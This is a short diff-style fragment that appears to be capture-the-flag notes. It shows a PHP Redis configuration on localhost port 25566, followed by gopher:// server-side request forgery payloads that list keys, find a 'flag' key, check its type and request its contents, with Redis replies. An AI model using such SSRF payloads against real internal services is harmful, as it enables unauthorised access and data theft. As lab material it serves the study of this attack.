@@ -1,0 +1,19 @@
+// redis config
+define('REDIS_HOST', 'localhost');
+define('REDIS_PORT', 25566);
+================================================
+gopher://localhost:25566/_keys%20*%0aquit
+*1
+$4
+flag
++OK
+
+gopher://localhost:25566/_get%2520flag%250a_quit
+-WRONGTYPE Operation against a key holding the wrong kind of value
++OK
+
+gopher://localhost:25566/_type%2520flag%250a_quit
++list
++OK
+
+gopher://localhost:25566/_lrange%2520flag%25200%252032%250a_quit
